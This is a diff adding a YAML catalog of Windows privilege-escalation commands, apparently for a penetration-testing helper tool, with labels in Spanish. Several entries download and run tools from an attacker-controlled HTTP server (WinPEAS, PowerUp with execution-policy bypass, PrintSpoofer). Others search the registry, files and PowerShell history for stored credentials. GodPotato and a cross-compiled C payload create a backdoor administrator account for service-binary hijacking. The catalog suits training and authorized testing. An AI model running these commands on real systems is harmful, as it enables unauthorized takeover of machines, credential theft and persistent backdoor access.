@@ -1,0 +1,199 @@
+tools:
+  - id: winpeas
+    name: "WinPEAS - Automated Enum"
+    description: "Enumeración automática completa para PrivEsc en Windows: servicios, credenciales, permisos, etc."
+    command: 'iwr -uri http://{lhost}:{lport}/winPEASx64.exe -Outfile winPEAS.exe; .\winPEAS.exe'
+    params:
+      - name: lhost
+        label: "IP atacante (HTTP server)"
+        placeholder: "10.10.14.1"
+        required: true
+      - name: lport
+        label: "Puerto HTTP"
+        placeholder: "80"
+        default: "80"
+    tags: [privesc, windows, winpeas, automated]
+    notes: "Ejecutar: cp /usr/share/peass/winpeas/winPEASx64.exe . && python3 -m http.server 80 (en Kali)"
+
+  - id: powerup
+    name: "PowerUp.ps1 - PrivEsc Check"
+    description: "Script PowerShell para detectar vectores de PrivEsc: servicios modificables, unquoted paths, etc."
+    command: "iwr -uri http://{lhost}:{lport}/PowerUp.ps1 -Outfile PowerUp.ps1; powershell -ep bypass -c \". .\\PowerUp.ps1; Invoke-AllChecks\""
+    params:
+      - name: lhost
+        label: "IP atacante (HTTP server)"
+        placeholder: "10.10.14.1"
+        required: true
+      - name: lport
+        label: "Puerto HTTP"
+        placeholder: "80"
+        default: "80"
+    tags: [privesc, windows, powerup, automated]
+    notes: "cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 . (en Kali)"
+
+  - id: win_services_enum
+    name: "Windows - Enum Servicios en Ejecución"
+    description: "Lista todos los servicios activos con su ruta de binario (útil para Service Binary Hijacking)"
+    command: "Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}"
+    params: []
+    tags: [privesc, windows, services, enumeration]
+    notes: "Ejecutar en PowerShell con sesión RDP/interactiva. En WinRM o bind shell puede dar 'permission denied'."
+
+  - id: win_service_perms
+    name: "Windows - Permisos de Binario de Servicio (icacls)"
+    description: "Comprueba si el usuario actual puede escribir en el binario de un servicio (Service Binary Hijacking)"
+    command: "icacls \"{service_path}\""
+    params:
+      - name: service_path
+        label: "Ruta del binario del servicio"
+        placeholder: "C:\\xampp\\mysql\\bin\\mysqld.exe"
+        required: true
+    tags: [privesc, windows, services, icacls, hijacking]
+    notes: "Buscar BUILTIN\\Users:(F) o (W). F=Full, M=Modify, W=Write. Si Users tiene F/W = vulnerable."
+
+  - id: win_accesschk_service
+    name: "AccessChk - Permisos de Servicios"
+    description: "Verifica qué servicios puede modificar el usuario actual (requiere accesschk.exe de Sysinternals)"
+    command: "accesschk.exe -uwcqv \"{user}\" * /accepteula"
+    params:
+      - name: user
+        label: "Usuario actual"
+        placeholder: "dave"
+        required: true
+    tags: [privesc, windows, accesschk, services]
+    notes: "Descargar: https://learn.microsoft.com/sysinternals/downloads/accesschk"
+
+  - id: win_startup_type
+    name: "Windows - Tipo de Inicio de Servicio"
+    description: "Comprueba si un servicio tiene StartMode=Auto (necesario para PrivEsc con reboot)"
+    command: "Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like '{service_name}'}"
+    params:
+      - name: service_name
+        label: "Nombre del servicio"
+        placeholder: "mysql"
+        required: true
+    tags: [privesc, windows, services, startup]
+
+  - id: win_unquoted_paths
+    name: "Windows - Unquoted Service Paths"
+    description: "Detecta servicios con rutas sin comillas (Unquoted Service Path PrivEsc)"
+    command: "Get-CimInstance -ClassName win32_service | Select Name,PathName | Where-Object {$_.PathName -notmatch '\"' -and $_.PathName -notmatch '^[A-Z]:\\\\Windows'}"
+    params: []
+    tags: [privesc, windows, unquoted-paths, services]
+    notes: "Si la ruta tiene espacios y no está entre comillas, se puede colocar un binario malicioso en un punto intermedio."
+
+  - id: win_schtasks_enum
+    name: "Windows - Scheduled Tasks"
+    description: "Lista tareas programadas con su binario y nivel de privilegio"
+    command: "schtasks /query /fo LIST /v | findstr /i \"task\\|run\\|privilege\""
+    params: []
+    tags: [privesc, windows, scheduled-tasks, enumeration]
+
+  - id: win_whoami_priv
+    name: "Windows - Privilegios del Usuario (whoami /priv)"
+    description: "Muestra todos los privilegios del token actual. Buscar SeImpersonatePrivilege, SeDebugPrivilege, SeBackupPrivilege"
+    command: "whoami /priv"
+    params: []
+    tags: [privesc, windows, privileges, token, whoami]
+    notes: "SeImpersonatePrivilege = potato attacks (PrintSpoofer, GodPotato). SeBackupPrivilege = leer SAM. SeDebugPrivilege = leer LSASS."
+
+  - id: win_printspoofer
+    name: "PrintSpoofer - Token Impersonation"
+    description: "PrivEsc desde SeImpersonatePrivilege a SYSTEM usando PrintSpoofer"
+    command: "iwr -uri http://{lhost}:{lport}/PrintSpoofer64.exe -Outfile ps.exe; .\\ps.exe -i -c cmd"
+    params:
+      - name: lhost
+        label: "IP atacante"
+        placeholder: "10.10.14.1"
+        required: true
+      - name: lport
+        label: "Puerto HTTP"
+        placeholder: "80"
+        default: "80"
+    tags: [privesc, windows, printspoofer, impersonation, system]
+    notes: "Requiere SeImpersonatePrivilege. Funciona en servicios IIS, SQL Server, etc. También: GodPotato, JuicyPotato."
+
+  - id: win_godpotato
+    name: "GodPotato - Token Impersonation"
+    description: "PrivEsc a SYSTEM con SeImpersonatePrivilege en Windows 2012-2022 / Win10-11"
+    command: ".\\GodPotato.exe -cmd \"cmd /c {command}\""
+    params:
+      - name: command
+        label: "Comando a ejecutar como SYSTEM"
+        placeholder: "net user hacker Password123! /add && net localgroup administrators hacker /add"
+        required: true
+    tags: [privesc, windows, godpotato, impersonation, system]
+    notes: "Requiere SeImpersonatePrivilege. Funciona en Windows 10/11 y Server 2012-2022."
+
+  - id: win_ps_history
+    name: "Windows - PowerShell History (PSReadLine)"
+    description: "Obtiene el historial de PowerShell guardado por PSReadLine (no borrado por Clear-History)"
+    command: "(Get-PSReadlineOption).HistorySavePath; type (Get-PSReadlineOption).HistorySavePath"
+    params: []
+    tags: [privesc, windows, powershell, history, credentials]
+    notes: "Ruta típica: C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"
+
+  - id: win_ps_transcripts
+    name: "Windows - PowerShell Transcripts"
+    description: "Busca ficheros de transcripción de PowerShell que puedan contener credenciales en claro"
+    command: "Get-ChildItem -Path C:\\ -Include *transcript* -Recurse -ErrorAction SilentlyContinue | Select FullName"
+    params: []
+    tags: [privesc, windows, powershell, transcripts, credentials]
+    notes: "Rutas comunes: C:\\Users\\<user>\\, C:\\Users\\Public\\Transcripts\\, shares de red."
+
+  - id: win_find_passwords
+    name: "Windows - Buscar Contraseñas en Ficheros"
+    description: "Busca palabras clave de contraseñas en ficheros del sistema"
+    command: "findstr /si /m \"password\\|passwd\\|credential\\|secret\" *.txt *.ini *.xml *.config 2>nul"
+    params: []
+    tags: [privesc, windows, passwords, files, credentials]
+
+  - id: win_reg_credentials
+    name: "Windows - Credenciales en Registro"
+    description: "Busca credenciales almacenadas en el registro de Windows (AutoLogon, WinVNC, etc.)"
+    command: "reg query HKLM /f password /t REG_SZ /s; reg query HKCU /f password /t REG_SZ /s"
+    params: []
+    tags: [privesc, windows, registry, credentials, autologon]
+
+  - id: win_installed_apps
+    name: "Windows - Aplicaciones Instaladas (32/64 bit)"
+    description: "Lista aplicaciones instaladas buscando versiones vulnerables (para DLL Hijacking o exploits locales)"
+    command: "Get-ItemProperty \"HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\" | select displayname,displayversion; Get-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\" | select displayname,displayversion"
+    params: []
+    tags: [privesc, windows, applications, enumeration]
+
+  - id: win_adduser_payload
+    name: "Windows - Compilar Payload AddUser (Linux)"
+    description: "Compila en Kali un binario Windows que crea usuario admin (para Service Binary Hijacking)"
+    command: "cat > adduser.c << 'EOF'\n#include <stdlib.h>\nint main() {\n  system(\"net user {user} {password} /add\");\n  system(\"net localgroup administrators {user} /add\");\n  return 0;\n}\nEOF\nx86_64-w64-mingw32-gcc adduser.c -o {output}"
+    params:
+      - name: user
+        label: "Usuario a crear"
+        placeholder: "hacker"
+        required: true
+      - name: password
+        label: "Contraseña"
+        placeholder: "Password123!"
+        required: true
+      - name: output
+        label: "Nombre del ejecutable"
+        placeholder: "adduser.exe"
+        default: "adduser.exe"
+    tags: [privesc, windows, payload, cross-compile, services]
+    notes: "Usar para reemplazar binario de servicio vulnerable. Requiere mingw-w64 en Kali."
+
+  - id: win_runas
+    name: "Windows - RunAs (ejecutar como otro usuario)"
+    description: "Ejecuta un proceso con las credenciales de otro usuario (requiere GUI o sesión interactiva)"
+    command: "runas /user:{domain}\\{user} cmd"
+    params:
+      - name: domain
+        label: "Dominio o hostname local"
+        placeholder: "WORKSTATION01"
+        required: true
+      - name: user
+        label: "Usuario objetivo"
+        placeholder: "administrator"
+        required: true
+    tags: [privesc, windows, runas, lateral-movement]
+    notes: "Sin GUI no funciona (la prompt de contraseña no acepta input en shells no interactivas)."
